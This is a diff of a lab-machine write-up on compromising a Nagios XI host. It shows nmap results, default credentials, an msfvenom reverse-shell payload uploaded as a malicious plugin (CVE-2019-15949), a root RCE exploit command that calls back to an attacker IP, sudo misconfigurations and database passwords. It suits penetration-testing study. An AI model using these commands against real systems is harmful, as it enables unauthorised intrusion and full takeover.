@@ -1,54 +1,57 @@
-# Monitoring (192.168.171.136)
+# Monitoring: Machine Notes
 
-## Enumeration
+## Recon
 
-### Nmap Results
-```text
-PORT     STATE SERVICE    REASON         VERSION
-22/tcp   open  ssh        syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
-25/tcp   open  smtp       syn-ack ttl 61 Postfix smtpd
-80/tcp   open  http       syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
-|_http-title: Nagios XI
-389/tcp  open  ldap       syn-ack ttl 61 OpenLDAP 2.2.X - 2.3.X
-443/tcp  open  ssl/http   syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
-5667/tcp open  tcpwrapped syn-ack ttl 61
-```
+### Nmap
+- Port 22/tcp: SSH (OpenSSH 7.2p2)
+- Port 25/tcp: SMTP (Postfix)
+- Port 80/tcp: HTTP (Nagios XI)
+- Port 389/tcp: LDAP (OpenLDAP)
+- Port 443/tcp: HTTPS (Nagios XI)
+- Port 5667/tcp: tcpwrapped
 
 ### Web Enumeration
-- Title: Nagios XI
-- Directory: `/nagios/`, `/nagiosxi/`
-- Default Creds Found: `nagiosadmin:admin`
+- Application: Nagios XI
+- Port: 80, 443
+- Directory Discovery:
+  - `/nagios/` (Requires Auth)
+  - `/nagiosxi/` (Main Interface)
+- Default Credentials Found: `nagiosadmin` : `admin`
 
-## Exploitation
+## Initial Access
 
-### Initial Access (Nagios XI Authenticated RCE)
-- **CVE**: CVE-2019-15949
-- **Method**: Manual plugin upload to `/nagiosxi/admin/monitoringplugins.php`
-- **Steps**:
-  1. Generate malicious plugin: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.233 LPORT=4444 -f elf -o check_icmp`
-  2. Upload as `check_icmp`.
-  3. Trigger via web interface.
-- **Reverse Shell**:
+### Nagios XI Authenticated RCE (CVE-2019-15949)
+- Nagios XI allows authenticated users to upload plugins.
+- Malicious ELF file can be uploaded as a plugin and executed.
+- **Payload Generation**:
   ```bash
-  nc -nlvp 4444
-  nagios@ubuntu:/tmp$ whoami
-  nagios
+  msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.233 LPORT=4444 -f elf -o check_icmp
   ```
+- **Exploitation**:
+  1. Login to Nagios XI.
+  2. Navigate to `Admin` -> `Manage Plugins`.
+  3. Upload the malicious `check_icmp` file.
+  4. Trigger the plugin to receive a reverse shell as the `nagios` user.
 
-### Privilege Escalation (Root)
-- `sudo -l` shows extensive NOPASSWD permissions.
-- **Exploit**: Used NagiosXI Root RCE script (`exploit.php`).
-- **Command**: `php exploit.php --host=192.168.171.136 --ssl=false --user=nagiosadmin --pass=admin --reverseip=192.168.45.233 --reverseport=8001`
-- **Result**: Root access obtained.
+## Privilege Escalation
 
----
+### Sudo Privileges
+- `sudo -l` shows extensive NOPASSWD entries:
+  - `/etc/init.d/nagios *`
+  - `/usr/bin/php /usr/local/nagiosxi/html/includes/components/autodiscovery/scripts/autodiscover_new.php`
+  - `/usr/local/nagiosxi/scripts/upgrade_to_latest.sh`
+  - `/usr/local/nagiosxi/scripts/backup_xi.sh`
 
-## Technical Details
+### Nagios XI Root RCE
+- Exploited using a PHP script targeting Nagios XI misconfigurations.
+- **Command**:
+  ```bash
+  php exploit.php --host=192.168.171.136 --ssl=false --user=nagiosadmin --pass=admin --reverseip=192.168.45.233 --reverseport=8001
+  ```
+- Result: Root access.
 
-### Database Credentials
-- File: `ndo2db.cfg`
+## Post-Exploitation / Credentials
+- Database Config: `lock_file=/usr/local/nagios/var/ndo2db.lock`
 - DB User: `ndoutils`
 - DB Pass: `n@gweb`
-
-### Exploitation One-Liner
-`python3 exploit.py -t http://192.168.171.136/ -b /nagiosxi/ -u nagiosadmin -p nagiosadmin -lh 192.168.45.233 -lp 4444 -k`
+- DB Name: `nagios`
